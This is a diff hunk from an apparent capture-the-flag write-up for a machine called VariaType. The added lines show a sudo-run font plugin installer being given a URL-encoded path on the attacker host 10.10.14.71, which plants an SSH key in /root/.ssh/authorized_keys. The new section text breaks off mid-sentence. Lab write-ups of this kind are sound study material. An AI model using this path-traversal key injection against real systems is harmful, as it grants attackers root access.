@@ -2200,17 +2200,21 @@ Using the discovered `sudo` privilege, we forced the root-run script to "install
 **Output:**
 
 ```shell
-┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
-└─$ cp root_key.pub ./root/.ssh/authorized_keys
-
-┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
-└─$ tree -a ./root
-./root
-└── .ssh
-    └── authorized_keys
-
-2 directories, 1 file
+steve@variatype:/tmp/ffarchive-7646-1$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.14.71/%2froot%2f.ssh%2fauthorized_keys'
+<ttp://10.10.14.71/%2froot%2f.ssh%2fauthorized_keys'
+2026-03-25 08:35:07,242 [INFO] Attempting to install plugin from: http://10.10.14.71/%2froot%2f.ssh%2fauthorized_keys
+2026-03-25 08:35:07,256 [INFO] Downloading http://10.10.14.71/%2froot%2f.ssh%2fauthorized_keys
+2026-03-25 08:35:07,842 [INFO] Plugin installed at: /root/.ssh/authorized_keys
+[+] Plugin installed successfully.
 ```
+<div align="center">
+<br>
+<br>
+</div>
+
+#### 5.2.4 Establishing the Root Shell (Attacker Side)
+
+With the public key successfully injected into the target's root account, we acan 
 <div align="center">
 <br>
 <br>
